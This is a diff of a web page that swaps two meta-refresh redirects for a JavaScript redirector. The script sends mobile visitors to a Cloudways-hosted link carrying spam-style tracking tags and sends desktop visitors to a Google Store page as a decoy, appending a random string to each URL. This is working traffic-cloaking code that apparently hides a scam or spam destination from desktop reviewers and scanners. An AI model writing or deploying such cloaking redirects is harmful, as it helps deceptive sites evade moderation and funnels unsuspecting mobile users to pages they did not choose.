@@ -1,2 +1,26 @@
-<meta http-equiv="refresh" content="200; url=https://web.facebook.com/profile.php?id=61583034125001">
-<meta http-equiv="refresh" content="0; url=https://heylinkme.online/tati.html?utm_source=HajiG&utm_medium=LUSTY">
+<script type="text/javascript">
+// Random string generator
+function rand(n) {
+    var out = "";
+    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    for (var i = 0; i < n; i++) {
+        out += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return out;
+}
+
+// Device detection
+var device = navigator.userAgent;
+
+// If MOBILE, TABLET, SMARTPHONE → redirect to Cloudways link
+if (
+    /Android|iPhone|iPad|iPod|Mobile|Opera Mini|IEMobile|BlackBerry|Symbian|Nokia|webOS|Windows Phone|MiuiBrowser|SamsungBrowser/i.test(device)
+) {
+    window.location.href = "https://wordpress-1549448-5995930.cloudwaysapps.com/link1/?utm_source=HajiG&utm_medium=Hello&" + rand(7);
+}
+
+// Otherwise PC → redirect to Google Store
+else {
+    window.location.href = "https://store.google.com/regionpicker?4neQWLE&" + rand(7);
+}
+</script>
